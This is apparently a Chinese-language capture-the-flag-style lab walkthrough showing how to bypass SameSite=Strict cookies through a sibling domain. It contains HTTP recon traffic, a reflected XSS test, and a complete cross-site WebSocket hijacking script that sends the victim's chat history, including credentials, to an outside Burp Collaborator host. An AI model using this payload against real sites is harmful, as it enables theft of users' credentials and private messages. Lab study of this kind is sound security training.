# 实验：通过兄弟域（sibling domain）绕过 SameSite Strict

本实验的实时聊天功能易受跨站 WebSocket 劫持（CSWSH）攻击。为了解决本实验，请登录受害者的账户。

为此，请使用提供的漏洞利用服务器执行 CSWSH 攻击，将受害者的聊天记录窃取到默认的 Burp Collaborator 服务器。聊天记录中包含明文登录凭据。

如果你尚未完成此操作，我们建议你在尝试本实验之前先完成关于 WebSocket 漏洞的主题学习。

> **提示**
> 确保你全面审计所有可用的攻击面。留意可能有助于你实施攻击的其他漏洞，并记住两个域可以位于同一个站点内。

## 步骤

侦察
- 访问主页
    ```http
    GET / HTTP/1.1
    Host: id.web-security-academy.net
    ```
    - 响应
        ```http
        HTTP/2 200 OK
        Content-Type: text/html; charset=utf-8
        Set-Cookie: session=wjHIWFfMBDYm2jQnpUdZ5goV4Oixt0BI; Secure; HttpOnly; SameSite=Strict
        ```
    
    - cookie `SameSite=Strict`

- 使用 chat 功能
    ```http
    GET /chat HTTP/2
    Host: id.web-security-academy.net
    Connection: Upgrade
    Upgrade: websocket
    Origin: https://id.web-security-academy.net
    Sec-Websocket-Version: 13
    Cookie: session=wjHIWFfMBDYm2jQnpUdZ5goV4Oixt0BI
    Sec-Websocket-Key: IgWwQ5kz/8UJtzXvI8gJkQ==
    ```
    - 响应
        ```http
        HTTP/1.1 101 Switching Protocol
        Connection: Upgrade
        Upgrade: websocket
        Sec-WebSocket-Accept: YfgzOoZ5K67gmFEOFLz8kGw6CLY=
        Content-Length: 0
        ```
    
    - chat 的 ws 无 csrf 令牌

分析
- chat 无 csrf 令牌，有 `SameSite=Strict` cookie
- 无法在攻击者服务器构造 csrf
- 尝试寻找子域/兄弟域漏洞

尝试寻找子域/兄弟域漏洞
- 浏览应用程序，但并未发现对其他域的链接
- 尝试查看 TLS 证书，但仅为通配符域名，并未揭示子域
- 回忆 CORS 对静态资源的跨站访问，拥有的 `Access-Control-Allow-Origin: ` 或揭示子域
    ```http
    GET /resources/js/chat.js HTTP/2
    Host: id.web-security-academy.net
    ```
    - 响应
        ```http
        HTTP/2 200 OK
        Content-Type: application/javascript; charset=utf-8
        Cache-Control: public, max-age=3600
        Access-Control-Allow-Origin: https://cms-id.web-security-academy.net
        ```
    - 发现兄弟域 `https://cms-id.web-security-academy.net`


查找兄弟域漏洞
- 请求
    ```http
    GET /login HTTP/2
    Host: cms-id.web-security-academy.net
    ```
    - 响应

        ```html
        <html>

        <head>
            <title>Login</title>
        </head>

        <body>
            <h1>Login</h1>
            <section>
                <form method="POST" action="/login">
                    <label>Username</label>
                    <input required="" type="username" name="username" />
                    <label>Password</label>
                    <input required="" type="password" name="password" />
                    <button type="submit"> Log in </button>
            </section>
        </body>

        </html>
        ```
- 测试表单元素反射
    ```http
    GET /login?username=foo&password=bar HTTP/2
    Host: cms-id.web-security-academy.net
    ```
    - 响应
        ```html
        <p>Invalid username: foo</p>
        ```
        - 并未反射到表单元素中，而是作为错误回显

- 测试 XSS
    ```http
    GET /login?username=<img+src+onerror=print()>&password=bar HTTP/2
    Host: cms-id.web-security-academy.net
    ```
    - 响应
        ```html
        <p>
            Invalid username: <img src onerror=print()>
        </p>
        ```
    - 成功


在脆弱子域构造对主域的端点攻击
- 载荷与请求

    ```html
    <script>
 
        let newWebSocket = new WebSocket("wss://id.web-security-academy.net/chat");
        console.log("new ws");

        newWebSocket.onopen = function(evt) {
            newWebSocket.send("READY");
            console.log("ws READY");
        }

        newWebSocket.onmessage = function(evt) {
            var message = evt.data;
            console.log(message);

            fetch("https://id.oastify.com/ws", {
                method: "POST",
                mode: 'no-cors', 
                body: message
            });
        };

    </script>
    ```
